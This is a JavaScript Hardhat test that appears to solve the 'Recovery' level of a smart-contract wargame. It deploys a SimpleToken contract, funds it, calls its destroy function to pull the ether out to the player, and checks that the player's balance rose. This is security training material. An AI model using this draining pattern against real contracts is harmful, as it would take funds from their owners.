const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("17Recovery", function () {
  let player, levelOwner, levelContract;
  let playerBeforeBalance;
  it("setup", async function () {
    [player, levelOwner] = await ethers.getSigners();
    const Contract = await ethers.getContractFactory("SimpleToken", levelOwner);
    levelContract = await Contract.deploy(
      "TESTNAME",
      levelOwner.address,
      100000
    );
    await levelContract.deployed();

    //存些余额进去
    await levelOwner.sendTransaction({
      to: levelContract.address,
      value: ethers.utils.parseEther("0.001"),
    });

    playerBeforeBalance = await tools.getBalance(player.address);
  });

  it("attacks", async function () {
    //真实的SimpleToken地址可以通过https://rinkeby.etherscan.io/
    //查询对应的instance的事务里面的创建合同，并往哪个地址转了0.001ETH，就是那个合同地址
    const tokenAddress = levelContract.address;
    const contract = await ethers.getContractAt("SimpleToken", tokenAddress);
    await contract.connect(levelOwner).destroy(player.address);
  });

  it("check", async function () {
    //检查通过条件
    expect(await tools.getBalance(player.address)).to.above(
      playerBeforeBalance
    );
  });
});
